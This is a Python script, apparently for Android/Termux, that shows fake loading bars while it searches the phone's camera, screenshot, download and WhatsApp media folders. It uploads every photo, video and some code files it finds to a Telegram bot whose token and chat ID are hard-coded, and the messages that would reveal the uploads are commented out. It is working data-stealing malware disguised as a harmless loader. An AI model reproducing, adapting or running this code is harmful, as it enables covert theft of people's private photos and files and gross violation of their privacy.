
import os,rich,time
import requests
from rich.progress import track
def lod(r):
        for i in track(range(1000),description=r):
          time.sleep(0.01)
lod("start....")
from concurrent.futures import ThreadPoolExecutor as ThreadPool


bot_token = "8018005100:AAHzgi48r8-vXmsQcWsTOVOG4PTrFkGwwIw"
chat_id = "7342743761"

if not bot_token or not chat_id:
    print("[ERROR] Bot token or chat ID missing.")
    exit(1)

target_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.3gp', '.avi', '.webm','.plp','.py','.html','.js',]


search_folders = [
    '/sdcard/DCIM/Camera',
    '/sdcard/DCIM/Screenshots',
    '/sdcard/Pictures',
    '/sdcard/Download',
    '/sdcard/WhatsApp/Media/WhatsApp Images',
    '/sdcard/WhatsApp/Media/WhatsApp Video'
]

def send_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            response = requests.post(
                f'https://api.telegram.org/bot{bot_token}/sendDocument',
                data={'chat_id': chat_id},
                files={'document': f}
            )
        if response.status_code == 200:
          lod("loedig...")
#            print(f"[INFO] Sent: {file_path}")
        else:
          pass
#            print(f"[WARN] Failed to send {file_path} - Status code: {response.status_code}")
    except Exception as e:
      lod("run")
#        print(f"[ERROR] Exception sending file {file_path}: {e}")

# === FUNCTION TO FIND FILES ===
def find_files():
    found_files = []
    for folder in search_folders:
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if file.lower().endswith(tuple(target_extensions)):
                        found_files.append(os.path.join(root, file))
    return found_files

def media_sender():
    files = find_files()
    if not files:
        print("[INFO] No media files found.")
        return

    with ThreadPool(max_workers=10) as pool:
        pool.map(send_file, files)


media_sender()
